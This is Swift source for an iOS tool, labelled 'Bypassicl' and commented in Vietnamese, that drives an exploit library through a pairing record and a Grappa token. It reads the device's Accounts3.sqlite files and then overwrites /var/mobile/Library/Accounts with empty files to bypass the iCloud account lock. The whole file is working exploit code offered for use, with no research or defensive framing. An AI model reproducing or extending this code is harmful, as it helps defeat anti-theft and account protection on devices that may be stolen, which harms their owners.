import Foundation
import Combine

class AirliftService: ObservableObject {
    static let shared = AirliftService()
    
    @Published var logs: String = "=== Bypassicl Log ===\n"
    
    private let accountsDir = "/var/mobile/Library/Accounts"
    private let targetFiles = ["Accounts3.sqlite", "Accounts3.sqlite-shm", "Accounts3.sqlite-wal"]
    
    private var pairingPath: String?
    
    var backupDir: URL {
        let docDir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        return docDir.appendingPathComponent("AccountsBackup")
    }
    
    private func log(_ message: String) {
        DispatchQueue.main.async {
            self.logs += message + "\n"
            print(message)
        }
    }
    
    // Log callback cho AirliftFFI
    private static let logCallback: ALLogCallback = { ctx, msg in
        guard let msg = msg else { return }
        let str = String(cString: msg)
        if let ctx = ctx {
            let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
            service.log("[Airlift] \(str)")
        }
    }
    
    // MARK: - Chuẩn bị
    func connect() -> Bool {
        log("[*] Đang chuẩn bị...")
        
        // Grappa token (từ GrappaHelper)
        guard generateGrappaToken() != nil else {
            log("❌ Không tạo được Grappa Token")
            return false
        }
        log("✅ Grappa Token OK")
        
        // Pairing file
        guard let pairing = findPairingFile() else {
            log("❌ Không tìm thấy pairing file trong Documents")
            log("👉 Copy file pairingRecord.mobiledevicepairing vào Documents của app")
            return false
        }
        self.pairingPath = pairing
        log("✅ Pairing: \(pairing)")
        return true
    }
    
    private func generateGrappaToken() -> Data? {
        let maxLen = 1024
        var buffer = [UInt8](repeating: 0, count: maxLen)
        var outLen: size_t = 0
        var errBuffer = [CChar](repeating: 0, count: 256)
        
        let result = ALGetGrappaToken(1, 0, 1, &buffer, maxLen, &outLen, &errBuffer, 256)
        
        if result == 0 {
            return Data(bytes: buffer, count: Int(outLen))
        } else {
            let msg = String(cString: errBuffer)
            log("Grappa Error (\(result)): \(msg)")
            return nil
        }
    }
    
    private func findPairingFile() -> String? {
        let doc = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let names = [
            "pairingRecord.mobiledevicepairing",
            "pairingRecord.plist",
            "pairing.plist"
        ]
        for name in names {
            let url = doc.appendingPathComponent(name)
            if FileManager.default.fileExists(atPath: url.path) {
                return url.path
            }
        }
        return nil
    }
    
    // MARK: - Đọc file qua exploit
    private func ffi_read_file(_ iosPath: String) -> Data? {
        guard let pairing = pairingPath else { return nil }
        
        var outData: UnsafeMutablePointer<UInt8>? = nil
        var outLen: size_t = 0
        var outError: UnsafeMutablePointer<CChar>? = nil
        
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        
        let result = al_exploit_read_file(
            pairing,
            iosPath,
            AirliftService.logCallback,
            ctx,
            &outData,
            &outLen,
            &outError
        )
        
        defer {
            if let e = outError { al_string_free(e) }
            if let d = outData { al_bytes_free(d, outLen) }
        }
        
        guard result == 0, let ptr = outData, outLen > 0 else {
            let err = outError != nil ? String(cString: outError!) : "unknown"
            log("❌ Đọc thất bại \(iosPath): \(err)")
            return nil
        }
        
        return Data(bytes: ptr, count: Int(outLen))
    }
    
    // MARK: - Ghi đè thư mục
    private func ffi_write_dir(sourceDir: String, targetDir: String) -> Bool {
        guard let pairing = pairingPath else { return false }
        
        var outError: UnsafeMutablePointer<CChar>? = nil
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        
        let result = al_exploit_write_dir(
            pairing,
            sourceDir,
            targetDir,
            AirliftService.logCallback,
            ctx,
            &outError
        )
        
        defer {
            if let e = outError { al_string_free(e) }
        }
        
        if result != 0 {
            let err = outError != nil ? String(cString: outError!) : "unknown"
            log("❌ Ghi đè thất bại: \(err)")
            return false
        }
        return true
    }
    
    // MARK: - Backup
    func backupAccounts() -> Bool {
        log("[*] Backup Accounts...")
        let fm = FileManager.default
        try? fm.createDirectory(at: backupDir, withIntermediateDirectories: true)
        
        var ok = true
        for file in targetFiles {
            let path = "\(accountsDir)/\(file)"
            guard let data = ffi_read_file(path) else {
                ok = false
                continue
            }
            do {
                try data.write(to: backupDir.appendingPathComponent(file))
                log("✅ Backup \(file) (\(data.count) bytes)")
            } catch {
                log("❌ Lỗi ghi backup: \(error.localizedDescription)")
                ok = false
            }
        }
        return ok
    }
    
    // MARK: - Bypass (ghi rỗng)
    func bypassICloud() {
        log("[*] Bắt đầu Bypass (ghi đè rỗng)...")
        
        guard backupAccounts() else {
            log("❌ Hủy vì backup thất bại")
            return
        }
        
        // Tạo thư mục tạm chứa 3 file rỗng
        let tmp = FileManager.default.temporaryDirectory.appendingPathComponent("empty_accounts_\(UUID().uuidString)")
        try? FileManager.default.createDirectory(at: tmp, withIntermediateDirectories: true)
        
        for file in targetFiles {
            try? Data().write(to: tmp.appendingPathComponent(file))
        }
        
        log("[*] Đang ghi đè \(accountsDir) bằng file rỗng...")
        
        if ffi_write_dir(sourceDir: tmp.path, targetDir: accountsDir) {
            log("🎉 BYPASS THÀNH CÔNG!")
            log("👉 Reboot thiết bị ngay.")
        } else {
            log("❌ Ghi đè thất bại")
        }
        
        try? FileManager.default.removeItem(at: tmp)
    }
}